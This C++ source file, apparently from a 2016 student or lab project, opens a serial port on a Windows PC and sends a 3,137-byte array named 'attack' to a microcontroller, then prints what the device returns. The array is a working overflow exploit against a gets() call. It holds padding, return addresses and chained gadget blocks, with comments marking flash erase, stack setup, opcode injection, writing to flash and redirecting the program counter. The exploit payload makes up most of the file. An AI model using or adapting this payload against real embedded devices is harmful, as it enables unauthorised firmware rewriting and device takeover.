//------------------------------------------------------------------------------------
//
//	Code: PC to uController
//	Authors: Justin Cox & Tyler Travis
//	Date: 2/24/2016
//
//------------------------------------------------------------------------------------

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <Windows.h>
#include "Serial.h"


void readUart(void);

//------------------------------------------------------------------------------------
//	FUNCTION MAIN
//------------------------------------------------------------------------------------

CSerial serial;


int main(){

	//*************************
	//	SERIAL
	//*************************
	int port = 4; 
	int baudRate = 115200; 
	int dispType = 0;

	int nBytesSent = 0;

	const int SIZE = 3137;  //713 w/o delays

	unsigned char attack[SIZE] = {0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,  //Size 64 
								  0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,
								  0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,
								  0x62,0x62,0x62,0x62,0x62,0x62,
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								  0xc3,0x4a,0x00,0x01, //Flash erase done

								//Size 24 for each opcode block
								//Current # of blocks: 28

								//-------------------------------------------------------------------
								//		Delay for Erase
								//-------------------------------------------------------------------
								
								0xFF,0xFF,0xFF,0xFF,
								0x5D,0x42,0x00,0x01,

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								0xe7,0x1b,0x00,0x01,

								//-----------------------------
								//	Stack to 0x0000 0000
								//-----------------------------
								0xe0,0x06,0x00,0x20,
								0xe7,0x1b,0x00,0x01,
								0x08,0x02,0x00,0x20,  
								0xe9,0x1b,0x00,0x01,
								0x00,0xd1,0x0f,0x40,
								0xc3,0x4a,0x00,0x01,
								
								//-----------------------------
								//	Opcodes
								//-----------------------------
								0xF8,0x06,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0x4F,0xF6,0xFF,0x74, // <-- This changes (Opcode 1)
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								0xc3,0x4a,0x00,0x01,

								//-------------------------------------------------------------------
								//		WRITE DATA TO FLASH AND SET PC TO START OF CODE
								//-------------------------------------------------------------------
								0x38,0x09,0x00,0x20, // <-- This changes (stack)
								0xe7,0x1b,0x00,0x01,
								0x00,0x00,0x00,0x00, // <-- This changes (Start Address)
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								0xc3,0x4a,0x00,0x01,

								//-------------------------------------------------------------------
								//		Delay for write
								//-------------------------------------------------------------------
								0xFF,0xFF,0xFF,0xFF,
								0x5D,0x42,0x00,0x01,

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								0x05,0x00,0x00,0x00,
							
								'\r'};

								

	//-----------------------------------
	//		SERIAL CODE
	//-----------------------------------
	if (!serial.Open(port, baudRate)){
		printf("Error opening COM port! \n");
		return 0;
	}

	//-----------------------------------
	//	WRITE DATA
	//-----------------------------------
	
	nBytesSent = serial.SendData(attack, SIZE);

	//-----------------------------------
	//	READ DATA
	//-----------------------------------
	
	//Read Data Printed to gets()
	readUart();

	//Read Data from printf()
	readUart();

	serial.Close();

	return 0;
}

void readUart(void){

	int nBytesRead = 0;
	int curT = 0; 
	int oldT = 0;
	char readBuffer[1];
	
	while(readBuffer[0] != '\n')
	{
		curT = GetTickCount();

		if (curT - oldT > 5)
		{
			nBytesRead = serial.ReadData(readBuffer, sizeof(readBuffer));
	
			if (nBytesRead > 0)
			{

				for(int i = 0; i < nBytesRead; i++){
					printf("%c", readBuffer[i]);
				}

			}

			oldT = curT;
		}

	}

}